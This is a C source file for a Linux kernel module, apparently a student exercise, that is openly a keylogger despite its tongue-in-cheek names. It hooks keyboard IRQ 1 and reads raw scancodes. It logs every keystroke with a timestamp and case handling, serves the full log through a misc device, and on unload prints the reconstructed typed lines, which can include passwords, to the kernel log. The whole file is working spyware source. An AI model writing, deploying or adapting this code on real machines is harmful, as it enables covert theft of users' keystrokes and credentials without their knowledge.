// SPDX-License-Identifier: GPL-3.0-only
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/mutex.h>
#include <linux/interrupt.h>
#include <linux/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Romain Kowalski");
MODULE_DESCRIPTION("Absolutely not a keylogger.");

#define MODULE_NAME "not_a_keylogger"
#define DEVICE_NAME "definitely_not_key_logs"
#define LINE_SIZE 50
#define FULL_NAME_SIZE 20

struct	key_stroke {
	unsigned char		scancode;
	char			full_name[FULL_NAME_SIZE];
	bool			pressed; // 1 = pressed, 0 = released
	ktime_t			time;
};

struct work_data {
	struct work_struct	work_struct;
	unsigned char		scancode;
	bool			l_shift;
	bool			r_shift;
	bool			caps;
	struct mutex		keys_mutex;
	struct key_stroke	*captured_keys;
	size_t			captured_size;
	size_t			captured_max_size;
};

static const char	*us_keymap[][2] = {
	{"\0", "\0"}, {"ESCAPE", "ESCAPE"}, {"1", "!"}, {"2", "@"},
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"}, {"BACKSPACE", "BACKSPACE"}, {"TAB", "TAB"},
	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
	{"ENTER", "ENTER"}, {"CTRL L", "CTRL L"}, {"a", "A"}, {"s", "S"},
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
	{"'", "\""}, {"`", "~"}, {"SHIFT L", "SHIFT L"}, {"\\", "|"},
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
	{".", ">"}, {"/", "?"}, {"SHIFT R", "SHIFT R"}, {"KP *", "KP PRINT SCREEN"},
	{"ALT L", "ALT L"}, {"SPACE", "SPACE"}, {"CAPS LOCK", "CAPS LOCK"},
	{"F1", "F1"}, {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, {"F10", "F10"},
	{"NUM", "NUM"}, {"SCROLL", "SCROLL"}, {"KP 7", "HOME"},
	{"KP 8", "KP UP"}, {"KP 9", "KP PAGE UP"}, {"-", "-"}, {"KP 4", "KP LEFT"},
	{"KP 5", "KP 5"}, {"KP 6", "KP RIGHT"}, {"+", "+"}, {"KP 1", "KP END"},
	{"KP 2", "KP DOWN"}, {"KP 3", "KP PAGE DOWN"}, {"KP 0", "KP INSERT"},
	{"KP .", "KP DELETE"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"},
	{"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"ENTER", "ENTER"}, {"CTRL R", "CTRL R"}, {"/", "/"}, {"PRTSCR", "PRTSCR"},
	{"ALT R", "ALT R"}, {"\0", "\0"}, {"HOME", "HOME"}, {"UP", "UP"},
	{"PAGE UP", "PAGE UP"}, {"LEFT", "LEFT"}, {"RIGHT", "RIGHT"},
	{"END", "END"}, {"DOWN", "DOWN"}, {"PAGE DOWN", "PAGE DOWN"},
	{"INSERT", "INSERT"}, {"DELETE", "DELETE"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"PAUSE", "PAUSE"},
};

static struct work_data		work_data;
static char			*log_file;
static struct mutex		log_mutex;

static int	ktime_to_hours(ktime_t time)
{
	int	hours;

	hours = time / 1000000000; // seconds
	hours /= 60; // minutes
	hours /= 60; // hours
	hours = hours % 24;
	return hours;
}

static int	ktime_to_minutes(ktime_t time)
{
	int	minutes;

	minutes = time / 1000000000; // seconds
	minutes /= 60; // minutes
	minutes = minutes % 60;
	return minutes;
}

static int	ktime_to_seconds(ktime_t time)
{
	int	seconds;

	seconds = time / 1000000000; // seconds
	seconds = seconds % 60; // minutes
	return seconds;
}

static void	key_stroke_to_buffer(struct key_stroke entry, char *buffer,
					size_t len)
{
	int	hours;
	int	minutes;
	int	seconds;
	char	format[] = "[%2d:%02d:%02d] %s (%d) %s\n";

	hours = ktime_to_hours(entry.time);
	minutes = ktime_to_minutes(entry.time);
	seconds = ktime_to_seconds(entry.time);
	snprintf(buffer, len, format, hours, minutes, seconds, entry.full_name,
		entry.scancode, (entry.pressed ? "Pressed" : "Released"));
}

void	save_key_stroke(struct work_data *wd)
{
	int	scancode;
	int	pressed;

	scancode = wd->scancode & 0x7F;
	pressed = !(wd->scancode & 0x80);
	if (scancode > 120)
		return;
	mutex_lock(&wd->keys_mutex);
	if (wd->captured_size == wd->captured_max_size) {
		wd->captured_keys = krealloc_array(wd->captured_keys,
			wd->captured_max_size * 2, sizeof(struct key_stroke),
			GFP_KERNEL);
		if (!wd->captured_keys) {
			pr_err("%s: krealloc_array error", MODULE_NAME);
			mutex_unlock(&wd->keys_mutex);
			return;
		}
		wd->captured_max_size *= 2;
	}
	wd->captured_keys[wd->captured_size].scancode = scancode;
	wd->captured_keys[wd->captured_size].pressed = pressed;
	wd->captured_keys[wd->captured_size].time = ktime_get_real();
	strscpy(wd->captured_keys[wd->captured_size].full_name,
		us_keymap[scancode][(wd->l_shift | wd->r_shift) ^ wd->caps],
		FULL_NAME_SIZE);
	wd->captured_size++;
	mutex_unlock(&wd->keys_mutex);
}

void	bottom_half(struct work_struct *work)
{
	unsigned char 		pressed;
	unsigned char 		keycode;
	struct work_data	*wd;
       
	wd = container_of(work, struct work_data, work_struct);	
	pressed = wd->scancode & 0x80;
	keycode = wd->scancode & 0x7F;
	save_key_stroke(wd);
	if (keycode == 42) { // left shift
		if (!pressed)
			wd->l_shift = true;
		else
			wd->l_shift = false;
	}
	else if (keycode == 54) { // right shift
		if (!pressed)
			wd->r_shift = true;
		else
			wd->r_shift = false;
	}
	else if (keycode == 58) {
		if (!pressed)
			wd->caps = !wd->caps;
	}
}

static irqreturn_t	key_pressed(int irq, void *dummy)
{
	work_data.scancode = inb(0x60);
	schedule_work(&work_data.work_struct);
	return IRQ_HANDLED;
}

// 96 and 28 are RETURN scancodes
static int	next_return(int start)
{
	while (start < work_data.captured_size &&
		((work_data.captured_keys[start].scancode != 96 &&
		work_data.captured_keys[start].scancode != 28) ||
		!work_data.captured_keys[start].pressed))
		start++;
	return start;
}

static void	fill_line(char *line, int start, int end)
{
	int	i = 0;

	while (start < end) {
		if (work_data.captured_keys[start].pressed &&
			work_data.captured_keys[start].scancode == 57) {
			line[i] = ' ';
			i++;
		}
		if (work_data.captured_keys[start].scancode < 120 &&
			work_data.captured_keys[start].pressed && 
			strnlen(work_data.captured_keys[start].full_name,
				FULL_NAME_SIZE) == 1) {
			line[i] = work_data.captured_keys[start].full_name[0];
			i++;
		}
		start++;
	}
	line[i] = '\0';
}

static void	print_readable(void)
{
	int	start = 0;
	int	end = 0;
	char	*line = NULL;

	pr_info("Full readable logs:");
	while (end < work_data.captured_size) {
		end = next_return(start);
		line = kmalloc(end - start + 1, GFP_KERNEL);
		if (!line) {
			pr_err("%s: kmalloc error", MODULE_NAME);
			return;
		}
		fill_line(line, start, end);
		if (strlen(line))
			pr_info("%s", line);
		kfree(line);
		end++;
		start = end;
	}
}

static ssize_t	logs_read(struct file *filp, char __user *buffer, size_t len,
				loff_t *offset)
{
	int	ret = 0;

	mutex_lock(&log_mutex);
	if (log_file)
		ret = simple_read_from_buffer(buffer, len, offset, log_file,
						strlen(log_file));
	mutex_unlock(&log_mutex);
	return ret;
}

static int	logs_open(struct inode *inode, struct file *file)
{
	int	log_len;
	char	line[LINE_SIZE];
	int	i;

	try_module_get(THIS_MODULE);
	kfree(log_file);
	log_len = 0;
	i = 0;
	while (i < work_data.captured_size) {
		mutex_lock(&work_data.keys_mutex);
		key_stroke_to_buffer(work_data.captured_keys[i], line,
					LINE_SIZE);
		mutex_unlock(&work_data.keys_mutex);
		mutex_lock(&log_mutex);
		if (log_file)
			log_len = strlen(log_file);
		log_file = krealloc_array(log_file, log_len + strlen(line) + 1,
						sizeof(char), GFP_KERNEL);
		if (!log_file) {
			mutex_unlock(&log_mutex);
			pr_err("%s: krealloc_array error\n", MODULE_NAME);
			module_put(THIS_MODULE);
			return 1;
		}
		mutex_unlock(&log_mutex);
		if (log_len == 0)
			log_len = strscpy(log_file, line, strlen(line) + 1);
		else
			strncat(log_file, line, strlen(line));
		i++;
	}
	return 0;
}

static int	logs_close(struct inode *inode, struct file *file)
{
	if (module_refcount(THIS_MODULE) == 1) {
		mutex_lock(&log_mutex);
		kfree(log_file);
		log_file = NULL;
		mutex_unlock(&log_mutex);
	}
	module_put(THIS_MODULE);
	return 0;
}

static struct file_operations	logs_fops = {
	.open = &logs_open,
	.release = &logs_close,
	.read = &logs_read,
};

static struct miscdevice	logs_device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = DEVICE_NAME,
	.fops = &logs_fops
};

static int	__init kl_init(void)
{
	int	ret;

	ret = misc_register(&logs_device);
	if (ret) {
		pr_err("%s: Loading module failed\n", MODULE_NAME);
		return -ret;
	}
	ret = request_irq(1, key_pressed, IRQF_SHARED,
				"what?_no_its_not_a_kelogger_wdym",
				(void *)(key_pressed));
	if (ret) {
		pr_err("%s: Registering IRQ failed\n", MODULE_NAME);
		goto err_free_irq;
	}
	work_data.captured_max_size = 10;
	work_data.captured_keys = kmalloc_array(work_data.captured_max_size,
					sizeof(struct key_stroke), GFP_KERNEL);
	if (!work_data.captured_keys) {
		pr_err("%s: allocation of captured_keys array failed\n",
			MODULE_NAME);
		goto err_free_misc;
	}
	log_file = NULL;
	work_data.l_shift = false;
	work_data.r_shift = false;
	work_data.caps = false;
	mutex_init(&log_mutex);
	mutex_init(&work_data.keys_mutex);
	INIT_WORK(&work_data.work_struct, bottom_half);
	pr_info("%s: IRQ registered\n", MODULE_NAME);
	pr_info("%s: Module loaded\n", MODULE_NAME);
	return 0;

err_free_misc:
	misc_deregister(&logs_device);
err_free_irq:
	free_irq(1, key_pressed);
	return ret;
}

static void	__exit kl_cleanup(void)
{
	flush_work(&work_data.work_struct);
	print_readable();
	misc_deregister(&logs_device);
	kfree(log_file);
	kfree(work_data.captured_keys);
	free_irq(1, key_pressed);
	pr_info("%s: IRQ unregistered\n", MODULE_NAME);
	pr_info("%s: Module unloaded\n", MODULE_NAME);
}

module_init(kl_init);
module_exit(kl_cleanup);
